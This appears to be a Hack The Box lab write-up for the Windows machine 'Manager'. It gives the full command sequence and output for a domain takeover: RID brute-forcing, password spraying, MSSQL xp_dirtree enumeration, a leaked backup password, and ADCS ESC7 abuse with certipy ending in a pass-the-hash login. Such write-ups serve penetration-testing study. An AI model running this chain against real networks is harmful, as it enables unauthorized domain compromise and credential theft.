---
title: "HTB Manager"
date: 2026-05-17 14:51 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Meduim, ADCS, MSSQL]
image: /assets/img/posts/manager/manager.png
---
**HTB Manager** is a Windows `Active Directory` machine that starts with `RID brute-forcing` via a guest `SMB` session to enumerate users and discover a username-as-password credential for `operator`, accesses `MSSQL` and uses `xp_dirtree` to enumerate the web root and retrieve a backup archive containing plaintext credentials for `raven`, and escalates to `Domain Administrator` by abusing `ADCS ESC7` with `raven`'s `ManageCA` rights to issue a certificate for the Administrator account and perform `Pass-the-Certificate` authentication.

## Reconnaissance

### Scanning

- Nmap (All ports)

```
nmap -p- 10.129.39.86 --min-rate 1000 -nv
```
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49697/tcp open  unknown
49728/tcp open  unknown
49797/tcp open  unknown
63258/tcp open  unknown
```

- NSE Scripts & Version

```
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49693,49694,49697,49728,49797,63258 10.129.39.86 --min-rate 1000 -nv -oA nmap/nmap_all_ports
```
```
PORT      STATE    SERVICE       VERSION                                                                                                                     
53/tcp    open     domain        Simple DNS Plus                                                                                                             
80/tcp    open     http          Microsoft IIS httpd 10.0                                                                                                    
|_http-server-header: Microsoft-IIS/10.0                                                                                                                     
| http-methods:                                                                                                                                              
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                           
|_  Potentially risky methods: TRACE                                                                                                                         
|_http-title: Manager                                                                                                                                        
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-17 20:56:17Z)                                                              
135/tcp   open     msrpc         Microsoft Windows RPC                                                                                                       
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn                                                                                               
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)                                
|_ssl-date: 2026-05-17T20:57:54+00:00; +7h00m00s from scanner time.                                                                                          
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: DNS:dc01.manager.htb                                                                                                             
| Issuer: commonName=manager-DC01-CA                                                                                                                         
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2024-08-30T17:08:51                                                                                                                      
| Not valid after:  2122-07-27T10:31:04                                                                                                                      
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1                                                                                                           
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a                                                                                                 
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798                                                                   
445/tcp   open     microsoft-ds?                                                                                                                             
464/tcp   open     kpasswd5?                                                                                                                                 
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                         
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-17T20:57:55+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-17T20:29:49
| Not valid after:  2056-05-17T20:29:49
| MD5:     d5c3 837e 1925 67df 6223 c1eb 4908 5588
| SHA-1:   c2e9 a3d8 0306 e69b 1e4b a764 a18a 5295 bf9c 6a84
|_SHA-256: ed3a 02ec 093e 9f57 d2b8 aa42 272e e9e9 f0ee 40f4 57ad 4ba8 f774 ba03 ea08 6f45
| ms-sql-info: 
|   10.129.39.86:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-05-17T20:57:56+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.39.86:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-17T20:57:54+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: DNS:dc01.manager.htb                                                                                                             
| Issuer: commonName=manager-DC01-CA                                                                                                                         
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2024-08-30T17:08:51                                                                                                                      
| Not valid after:  2122-07-27T10:31:04                                                                                                                      
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1                                                                                                           
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a                                                                                                 
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798                                                                   
|_ssl-date: 2026-05-17T20:57:55+00:00; +7h00m00s from scanner time.                                                                                          
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                     
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open     msrpc         Microsoft Windows RPC
49697/tcp open     msrpc         Microsoft Windows RPC
49728/tcp open     msrpc         Microsoft Windows RPC
49797/tcp open     msrpc         Microsoft Windows RPC
63258/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-17T20:57:14
|_  start_date: N/A
```

### Configuration

- /etc/hosts

```bash
sudo nxc smb 10.129.39.86 --generate-hosts-file /etc/hosts
```

- /etc/krb5.conf

```bash
sudo nxc smb DC01.manager.htb --generate-krb5-file /etc/krb5.conf
```

- time

```bash
sudo ntpdate -u DC01.manager.htb
```

## SMB

### rid-bruteforce

```
nxc smb DC01.manager.htb -u 'guest' -p '' --rid-brute > raw_rids.txt
```
```
cat raw_rids.txt | grep -v 'SidTypeGroup' | awk '{print $6}' | awk -F\\ '{print $2}' > users.txt
```
```
cat users.txt | tr '[:upper:]' '[:lower:]' > lc_users.txt
```
```
nxc smb DC01.manager.htb -u lc_users.txt -p lc_users.txt --no-bruteforce --continue-on-success
```

### Valid-Creds

```
➜  Manager nxc smb DC01.manager.htb -u lc_users.txt -p lc_users.txt --no-bruteforce --continue-on-success
SMB         10.129.39.86    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.39.86    445    DC01             [+] manager.htb\: 
SMB         10.129.39.86    445    DC01             [+] manager.htb\guest::guest: (Guest)
SMB         10.129.39.86    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [+] manager.htb\cert:cert (Guest)
SMB         10.129.39.86    445    DC01             [+] manager.htb\ras:ras (Guest)
SMB         10.129.39.86    445    DC01             [+] manager.htb\allowed:allowed (Guest)
SMB         10.129.39.86    445    DC01             [+] manager.htb\denied:denied (Guest)
SMB         10.129.39.86    445    DC01             [-] manager.htb\dc01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [+] manager.htb\dnsadmins:dnsadmins (Guest)
SMB         10.129.39.86    445    DC01             [+] manager.htb\sqlserver2005sqlbrowseruser$dc01:sqlserver2005sqlbrowseruser$dc01 (Guest)
SMB         10.129.39.86    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.129.39.86    445    DC01             [+] manager.htb\operator:operator
```

## MSSQL

### Enumeration

```
impacket-mssqlclient 'manager.htb/operator:operator@DC01.manager.htb' -windows-auth
```

- VERSION,DBs

```
SQL (MANAGER\Operator  guest@master)> select @@version
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
SQL (MANAGER\Operator  guest@master)> select db_name()
------   
master
SQL (MANAGER\Operator  guest@master)> select name from master..sysdatabases
------   
master   
tempdb   
model    
msdb
```

- xp_dirtree (Traget `C:\inetpub\wwwroot\`)

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot\
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1
```

- `http://manager.htb/website-backup-27-07-23-old.zip``

## winrm as raven
![raven](/assets/img/posts/manager/raven.png)

```xml
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
```
```
evil-winrm -i DC01.manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
```

### rusthound

```
rusthound-ce --domain manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -z
```

### Bloodhound

![esc](/assets/img/posts/manager/esc.png)

## ADCS
### ESC 7

```
nxc ldap DC01.manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -M certipy-find
```
```
CERTIPY-... 10.129.39.86    389    DC01                 Web Enrollment
CERTIPY-... 10.129.39.86    389    DC01                   HTTP
CERTIPY-... 10.129.39.86    389    DC01                     Enabled                         : False
CERTIPY-... 10.129.39.86    389    DC01                   HTTPS
CERTIPY-... 10.129.39.86    389    DC01                     Enabled                         : False
CERTIPY-... 10.129.39.86    389    DC01                 User Specified SAN                  : Disabled
CERTIPY-... 10.129.39.86    389    DC01                 Request Disposition                 : Issue
CERTIPY-... 10.129.39.86    389    DC01                 Enforce Encryption for Requests     : Enabled
CERTIPY-... 10.129.39.86    389    DC01                 Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
CERTIPY-... 10.129.39.86    389    DC01                 Permissions
CERTIPY-... 10.129.39.86    389    DC01                   Owner                             : MANAGER.HTB\Administrators
CERTIPY-... 10.129.39.86    389    DC01                   Access Rights
CERTIPY-... 10.129.39.86    389    DC01                     Enroll                          : MANAGER.HTB\Operator
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Authenticated Users
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Raven
CERTIPY-... 10.129.39.86    389    DC01                     ManageCa                        : MANAGER.HTB\Administrators
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Domain Admins
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Enterprise Admins
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Raven
CERTIPY-... 10.129.39.86    389    DC01                     ManageCertificates              : MANAGER.HTB\Administrators
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Domain Admins
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Enterprise Admins
CERTIPY-... 10.129.39.86    389    DC01                 [+] User Enrollable Principals      : MANAGER.HTB\Raven
CERTIPY-... 10.129.39.86    389    DC01                                                       MANAGER.HTB\Authenticated Users
CERTIPY-... 10.129.39.86    389    DC01                 [+] User ACL Principals             : MANAGER.HTB\Raven
CERTIPY-... 10.129.39.86    389    DC01                 [!] Vulnerabilities
CERTIPY-... 10.129.39.86    389    DC01                   ESC7                              : User has dangerous permissions.
```
### Exploit

- [Hacktricks](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-authority-access-control---esc7)

```
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.39.86
```

```
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.39.86
```

```
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.39.86 -template SubCA -upn administrator@manager.htb -dc-ip 10.129.39.86
```

```
certipy-ad ca -ca 'manager-DC01-CA' -issue-request <ID> -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.39.86 -target 10.129.39.86
```

```
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.39.86 -retrieve <ID> -dc-ip 10.129.39.86
```

```
certipy-ad auth -pfx administrator.pfx -username administrator -domain manager.htb -dc-ip 10.129.39.86
```

```
evil-winrm -i 10.129.39.86 -u administrator -H <NTLM_HASH>
```
